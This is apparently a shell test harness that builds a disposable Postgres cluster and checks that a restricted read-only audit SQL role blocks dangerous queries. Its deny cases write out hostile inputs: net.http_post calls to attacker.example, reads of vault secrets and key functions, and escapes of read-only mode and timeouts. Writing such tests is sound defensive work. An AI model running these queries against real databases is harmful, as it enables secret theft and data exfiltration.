#!/usr/bin/env bash
# Disposable Postgres harness for the security-remediation triggers and the
# restricted audit SQL role. Creates a throwaway cluster under /tmp, loads a
# synthetic fixture + the REAL migration SQL from drizzle/migrations, runs
# allow/deny cases, prints a table, exits non-zero on any mismatch.
set -euo pipefail
if [ "$(id -u)" = 0 ]; then exec su nobody -s /bin/bash -c "PG=${PG:-} bash $(readlink -f "$0")"; fi
PG=${PG:-$(nix build nixpkgs#postgresql_16 --no-link --print-out-paths | grep -v -- -man | head -1)}
export PATH="$PG/bin:$PATH"
D=$(mktemp -d /tmp/pgharness.XXXX); trap 'pg_ctl -D "$D/data" stop -m immediate >/dev/null 2>&1 || true; rm -rf "$D"' EXIT
LC_ALL=C LANG=C initdb --no-locale -E UTF8 -D "$D/data" -U harness -A trust >/dev/null
pg_ctl -D "$D/data" -o "-k $D -p 55439 -c listen_addresses=''" -l "$D/log" start >/dev/null
P="psql -h $D -p 55439 -U harness -d postgres -v ON_ERROR_STOP=1 -q"
HERE=$(cd "$(dirname "$0")" && pwd); ROOT="$HERE/../.."
$P -f "$HERE/fixture.sql" >/dev/null
for m in "$ROOT"/drizzle/migrations/000[0-9]_*.sql; do
  sed '/--> statement-breakpoint/d' "$m" | $P >/dev/null
done
for f in "$HERE"/pending-*.sql; do [ -f "$f" ] && $P -f "$f" >/dev/null; done
$P -f "$HERE/cases.sql" >/dev/null

# 4. admin_run_readonly_sql: separate sessions so transaction mode is real.
ro() { # name uid readonly(0/1) query expect
  local tx="BEGIN"; [ "$3" = 1 ] && tx="BEGIN READ ONLY"
  local out; out=$($P -At 2>&1 <<SQL || true
$tx;
SELECT set_config('request.jwt.claim.sub', '$2', true);
SET LOCAL ROLE authenticated;
SELECT admin_run_readonly_sql(\$q\$$4\$q\$)::text;
ROLLBACK;
SQL
)
  local actual=allowed; echo "$out" | grep -q "ERROR" && actual=denied
  $P -c "INSERT INTO results VALUES (\$a\$$1\$a\$, '$5', '$actual', \$b\$$(echo "$out" | grep ERROR | head -1)\$b\$)"
}
A=00000000-0000-0000-0000-00000000000a; S=00000000-0000-0000-0000-000000000051
ro "audit-sql: admin reads rota (read-only tx)" $A 1 "select count(*) from rota_assignments" allowed
ro "audit-sql: admin reads profile names" $A 1 "select full_name from profiles" allowed
ro "audit-sql: non-admin denied" $S 1 "select 1" denied
ro "audit-sql: works in read-write tx (wrapper forces read-only)" $A 0 "select count(*) from rota_assignments" allowed
ro "audit-sql: net.http_post in read-write tx still blocked" $A 0 "select net.http_post('https://attacker.example')" denied
ro "audit-sql: vault.decrypted_secrets" $A 1 "select * from vault.decrypted_secrets" denied
ro "audit-sql: vault via CTE" $A 1 "with s as (select decrypted_secret from vault.decrypted_secrets) select * from s" denied
ro "audit-sql: _enc_key()" $A 1 "select _enc_key()" denied
ro "audit-sql: decrypt_text()" $A 1 "select decrypt_text('x'::bytea)" denied
ro "audit-sql: upsert_vault_secret side effect via CTE" $A 1 "with x as (select upsert_vault_secret('a','b','c')) select * from x" denied
ro "audit-sql: net.http_post side effect" $A 1 "select net.http_post('https://attacker.example')" denied
ro "audit-sql: sensitive column profiles.email" $A 1 "select email from profiles" denied
ro "audit-sql: calendar_feed_token" $A 1 "select calendar_feed_token from profiles" denied
ro "audit-sql: leave reason free text" $A 1 "select reason from leave_requests" denied
ro "audit-sql: push endpoints table" $A 1 "select * from push_subscriptions" denied
ro "audit-sql: multiple statements" $A 1 "select 1; select 2" denied
ro "audit-sql: data-modifying CTE" $A 1 "with d as (delete from leave_requests returning id) select * from d" denied

ro "audit-sql: icu_detection_matches.source_row (raw payload)" $A 1 "select source_row from icu_detection_matches" denied
ro "audit-sql: icu_detection_matches.matched_value (raw upstream text)" $A 1 "select matched_value from icu_detection_matches" denied
ro "audit-sql: icu_detection_matches allowlisted columns" $A 1 "select staff_id, session_date, matched_field from icu_detection_matches" allowed
ro "audit-sql: clwrota_sync_state.rota_report_url (secret URL)" $A 1 "select rota_report_url from clwrota_sync_state" denied
ro "audit-sql: clwrota_sync_state.last_error" $A 1 "select last_error from clwrota_sync_state" denied
ro "audit-sql: clwrota_sync_state allowlisted status" $A 1 "select last_status, last_sync_at from clwrota_sync_state" allowed
ro "audit-sql: rpc_access_alerts.details (not allowlisted table)" $A 1 "select details from rpc_access_alerts" denied
ro "audit-sql: pulse_survey_responses (individual wellbeing)" $A 1 "select score_1 from pulse_survey_responses" denied
ro "audit-sql: select * on table with hidden columns" $A 1 "select * from clwrota_sync_state" denied
ro "audit-sql: unicode-escaped set_config" $A 1 "select U&\"set\\005fconfig\"('transaction_read_only','off',true)" denied
ro "audit-sql: recursive exec_select via wrapper" $A 1 "select audit_ro.exec_select('select 1')" denied

# 4b. Boundary WITHOUT the wrapper's text screen: call audit_ro.exec_select
# directly (as the wrapper does) inside a forced read-only transaction with the
# live authenticated statement_timeout, then try to escape it.
raw() { # name query expect
  local out; out=$($P -At 2>&1 <<SQL || true
BEGIN;
SET LOCAL statement_timeout = '1500';
SELECT set_config('transaction_read_only','on',true);
SELECT audit_ro.exec_select(\$q\$$2\$q\$)::text;
ROLLBACK;
SQL
)
  local actual=allowed; echo "$out" | grep -q "ERROR" && actual=denied
  $P -c "INSERT INTO results VALUES (\$a\$$1\$a\$, '$3', '$actual', \$b\$$(echo "$out" | grep ERROR | head -1)\$b\$)"
}
raw "boundary: reset transaction_read_only off then side effect" "select net.http_post('https://attacker.example') from (select set_config('transaction_read_only','off',true)) s" denied
raw "boundary: reset transaction_read_only off alone" "select set_config('transaction_read_only','off',true)" denied
raw "boundary: disable statement_timeout then sleep 4s" "select pg_sleep(4) from (select set_config('statement_timeout','0',true)) s" denied
raw "boundary: recursive exec_select then side effect" "select audit_ro.exec_select('select net.http_post(''https://attacker.example'')')" denied
raw "boundary: recursive exec_select reads hidden column" "select audit_ro.exec_select('select source_row from icu_detection_matches')" denied
raw "boundary: write via data-modifying CTE" "with d as (delete from rota_assignments returning id) select * from d" denied
raw "boundary: allowlisted read still works" "select count(*) from rota_assignments" allowed
$P -c "INSERT INTO results SELECT 'boundary: no side effect reached net queue', 'allowed', CASE WHEN (SELECT count(*) FROM net.http_request_queue)=0 THEN 'allowed' ELSE 'denied' END, NULL"

$P -P pager=off -c "SELECT CASE WHEN expected=actual THEN 'PASS' ELSE 'FAIL' END AS result, name, expected, actual, left(coalesce(detail,''),90) AS detail FROM results ORDER BY 1, 2"
FAILS=$($P -At -c "SELECT count(*) FROM results WHERE expected<>actual")
TOTAL=$($P -At -c "SELECT count(*) FROM results")
echo "harness: $TOTAL cases, $FAILS failures"
[ "$FAILS" = 0 ]
